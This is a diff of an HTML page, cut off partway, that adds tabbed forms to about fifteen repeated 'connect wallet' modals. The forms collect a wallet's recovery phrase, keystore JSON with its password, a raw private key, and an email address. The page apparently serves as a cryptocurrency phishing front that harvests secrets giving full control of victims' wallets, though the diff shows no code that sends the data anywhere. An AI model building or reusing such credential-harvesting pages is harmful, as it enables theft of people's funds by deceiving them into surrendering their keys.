@@ -193,11 +193,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" type="button" onclick="phraseback()">Phrase</button>
+                <button type="button" class="keystore" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" type="button" onclick="privatekey()">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -216,6 +216,48 @@
                 </div>
 
             </div>
+
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
+
+
+
+
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>cancel</button>
                 <button type="submit" class="proceed">Proceeed</button>
@@ -234,11 +276,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" type="button" onclick="phraseback()">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -257,6 +299,47 @@
                 </div>
 
             </div>
+
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
+
+
+
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>cancel</button>
                 <button type="submit" class="proceed">Proceeed</button>
@@ -276,11 +359,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -296,6 +379,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -317,11 +437,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -337,6 +457,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -358,11 +515,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -378,6 +535,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -399,11 +593,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -419,6 +613,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -440,11 +671,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -460,6 +691,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -482,11 +750,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -502,6 +770,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -522,11 +827,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()">Phrase</button>
+                <button class="keystore" onclick="formtoggle()">Keystore JSON</button>
+                <button type="button" onclick="privatekey()" class="privatekey">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -542,6 +847,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -563,11 +905,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -583,6 +925,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -604,11 +983,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -624,6 +1003,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -645,11 +1061,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -665,6 +1081,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
                 </div>
             </div>
             <div class="modal-footer">
@@ -685,11 +1138,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -707,7 +1160,43 @@
                     </div>
                 </div>
             </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
 
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
                     class="proceed">Proceeed</button>
@@ -727,11 +1216,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -750,6 +1239,43 @@
                 </div>
             </div>
 
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
                     class="proceed">Proceeed</button>
@@ -769,11 +1295,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" type="button" onclick="formtoggle()">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -791,7 +1317,43 @@
                     </div>
                 </div>
             </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
 
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="Enter your private key">
+                    </div>
+                    <p>Your private key (keep this secure).</p>
+
+                </div>
+            </div>
             <div class="modal-footer">
                 <button type="button" class="wallet-btn-secondary" data-modal-close>Close</button> <button type="submit"
                     class="proceed">Proceeed</button>
@@ -811,11 +1373,11 @@
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
             <div class="modal-header">
-                <button class="activebtn">Phrase</button>
-                <button>Keystore JSON</button>
-                <button>Private Key</button>
+                <button class="activebtn" onclick="phraseback()" type="button">Phrase</button>
+                <button class="keystore" onclick="formtoggle()" type="button">Keystore JSON</button>
+                <button class="privatekey" onclick="privatekey()" type="button">Private Key</button>
             </div>
-            <div class="modal-body">
+            <div class="modal-body" id="modal-body1">
                 <div class="phraseholder">
                     <label for="wallet name">Wallet Name</label>
                     <div>
@@ -831,6 +1393,43 @@
                             placeholder="Enter your 12-24 word recovery phrase"></textarea>
                         <p>Typically 12(sometimes 24) words separated by single spaces</p>
                     </div>
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body2">
+                <div class="phraseholder">
+                    <p>Upload or paste your keystore JSON contents here.</p>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <div class="my-2">
+                        <input type="email" name="email" id="email" placeholder="Enter your email address">
+                    </div>
+                    <div class="my-2">
+                        <textarea name="phrase" id="phrase" placeholder="Keystore JSON"></textarea>
+
+                    </div>
+                    <div class="my-2">
+                        <input type="text" id="walletname" placeholder="wallet Name">
+                    </div>
+                    <p>Several lines of text with "{...}" plus the password you used to encrypt it.</p>
+
+                </div>
+            </div>
+            <div class="modal-body d-none" id="modal-body3">
+                <div class="phraseholder">
+                    <p>Enter your private key below:</p>
+                    <div class="my-2">
